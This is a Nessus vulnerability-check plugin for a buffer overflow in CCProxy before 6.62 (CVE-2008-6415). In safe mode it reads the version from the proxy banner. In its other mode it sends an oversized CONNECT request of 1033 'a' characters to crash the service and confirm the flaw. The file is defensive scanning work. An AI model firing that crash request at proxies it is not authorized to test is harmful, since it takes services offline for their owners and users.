#
#  (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(34489);
  script_version("$Revision: 1.10 $");

  script_cve_id("CVE-2008-6415");
  script_bugtraq_id(31416);
  script_osvdb_id(48528);
  script_xref(name:"Secunia", value:"31997"); 

  script_name(english:"CCProxy < 6.62 HTTP Proxy CONNECT Request Handling Remote Overflow");
  script_summary(english:"Checks CCProxy version or tries to crash the service"); 
 
 script_set_attribute(attribute:"synopsis", value:
"The remote proxy server is affected by a buffer overflow
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running CCProxy, a proxy server from Youngzsoft. 

The installed version is affected by a buffer overflow vulnerability. 
By sending a 'CONNECT' command along with large amounts of data, it
may be possible to crash the application or to execute arbitrary code
on the remote system." );
 script_set_attribute(attribute:"see_also", value:"http://jbrownsec.blogspot.com/2008/09/ccproxy-near-stealth-patching.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.youngzsoft.net/ccproxy/whatsnew.htm" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to CCProxy 6.62 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"false");
 script_cwe_id(119);

 script_set_attribute(attribute:"plugin_publication_date", value: "2008/10/24");
 script_cvs_date("$Date: 2015/09/24 20:59:28 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_MIXED_ATTACK);
  script_family(english:"Web Servers");
  script_copyright(english:"This script is Copyright (C) 2008-2015 Tenable Network Security, Inc.");
  script_dependencies("proxy_connect_detect.nasl");
  script_require_ports(808);
  exit(0);
}

include("global_settings.inc");

port = get_kb_item("Services/http_proxy");
if (!get_tcp_port_state(port)) exit(0);

if(safe_checks())
 {
   banner = get_kb_item("http_proxy/"+port+"/banner");
   banner = strstr(banner, "Proxy-agent");
   banner = chomp(banner);
   
   v = eregmatch(pattern:"^Proxy-agent: CCProxy ([0-9]+)\.([0-9]+)$", string:banner);
   if (isnull(v)) exit(0);
  
   if ( (int(v[1]) < 6) ||
        (int(v[1]) == 6  && int(v[2]) < 62 )
      )
    {
       if (report_verbosity)
        {
         report = string(
                  "\n",
	          "The remote proxy server responded with the following banner : ","\n\n",
	          banner,"\n\n",
		  "Note that Nessus only checked the version in the banner because safe\n", 
		  "checks were enabled for this scan.\n"
	        );	
 	   security_hole(port:port, extra:report);
        }   
        else	
         security_hole(port);
    }
  exit(0);
 }
else
 { 
  # Try to exploit the issue.

  soc = open_sock_tcp(port);
  if(!soc) exit(0);

  exploit = crap(length:1033, data:"a");

  req = strcat('CONNECT ', exploit, ' HTTP/1.1\r\n\r\n');
  send(socket:soc, data: req);
  banner = recv_line(socket:soc, length:4096);

  # Check if the Proxy service is alive 

  soc = open_sock_tcp(port);
  if(soc) 
   {
    close(soc);
    exit(0);
   } 

 # Try 3 more times before reporting.
  for(i = 0; i < 3 ; i++)
  {
    sleep(1);
    soc = open_sock_tcp(port);
    if(soc) 
    {
     close(soc);
     exit(0);
    }
  }

if(report_verbosity)
  {
    report = string(
                  "\n",
		  "Nessus was able to crash the remote proxy by sending the following\n",
		  "request :\n\n",
		  req); 				
	security_hole(port:port,extra:report);
  }
  else
    security_hole(port);
}  
